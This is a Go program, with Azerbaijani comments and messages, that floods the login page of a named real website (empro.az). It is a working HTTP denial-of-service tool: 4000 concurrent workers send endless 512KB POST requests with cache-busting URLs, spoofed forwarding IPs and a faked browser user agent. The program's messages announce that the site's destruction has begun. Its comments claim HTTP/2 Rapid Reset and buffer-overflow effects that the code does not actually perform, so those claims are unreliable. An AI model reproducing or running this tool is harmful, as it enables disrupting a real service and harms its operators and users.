package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"
	"sync/atomic"
)

func main() {
	target := "https://empro.az/#/login"
	// Railway resurslarını sona qədər istifadə etmək üçün
	workers := 4000 
	
	fmt.Printf("[!!!] JUDGMENT-DAY AKTİVDİR. Məhv başladıldı: %s\n", target)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			NextProtos:         []string{"h2"}, // HTTP/2 Rapid Reset üçün məcburidir
		},
		MaxIdleConns:        100000,
		MaxIdleConnsPerHost: 50000,
		DisableKeepAlives:   false,
		// Serverin "bağlantını qapat" siqnallarını görməzden gəlirik
		IdleConnTimeout:     0, 
	}

	client := &http.Client{Transport: tr, Timeout: 3 * time.Second}
	var crashCount uint64
	var totalSent uint64

	var wg sync.WaitGroup
	// Serverin "Buffer Overflow" yaşaması üçün çox sıx və ağır tekst
	payload := "destroy=" + strings.Repeat("X", 524288) // 512KB

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for {
				// Cache-i deşib keçən saniyəlik dinamik URL-lər
				u := fmt.Sprintf("%s&doom=%d&rnd=%s", target, time.Now().UnixNano(), randomString(10))
				
				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
				
				// Real Chrome 125 JA3 Fingerprint imitasiyası
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0")
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("Cache-Control", "no-cache")
				req.Header.Set("X-Forwarded-For", randomIP())

				resp, err := client.Do(req)
				atomic.AddUint64(&totalSent, 1)

				if err == nil {
					if resp.StatusCode >= 500 {
						atomic.AddUint64(&crashCount, 1)
					}
					resp.Body.Close()
				} else {
					atomic.AddUint64(&crashCount, 1)
					// Bağlantı qırılanda dərhal (0ms) yenisini aç
				}
			}
		}(i)
	}

	// Statistik Hesabat
	go func() {
		for {
			time.Sleep(2 * time.Second)
			fmt.Printf("[JUDGMENT] Cəmi Paket: %d | Server Status: ERROR (%d)\n", 
				atomic.LoadUint64(&totalSent), atomic.LoadUint64(&crashCount))
		}
	}()

	wg.Wait()
}

func randomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}
